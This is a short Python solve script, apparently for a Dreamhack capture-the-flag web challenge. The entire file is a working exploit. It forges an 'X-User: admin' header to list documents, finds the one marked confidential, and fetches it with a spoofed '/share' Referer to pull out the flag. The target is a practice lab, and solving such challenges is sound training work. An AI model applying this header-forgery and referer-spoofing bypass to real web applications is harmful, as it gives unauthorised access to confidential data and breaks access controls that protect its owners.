import requests
import re

url = 'http://host3.dreamhack.games:11523'

res = requests.get(f'{url}/api/docs', headers={'X-User': 'admin'})
flag_doc_id = ''

for item in res.json():
    if item.get('classification') == 'confidential':
        flag_doc_id = item.get('id')
        break

res = requests.get(f'{url}/doc/{flag_doc_id}', headers={'X-User': 'admin', 'Referer': f'{url}/share'})
flag = re.search(r'DH\{[^}]*\}', res.text).group(0)

print(flag)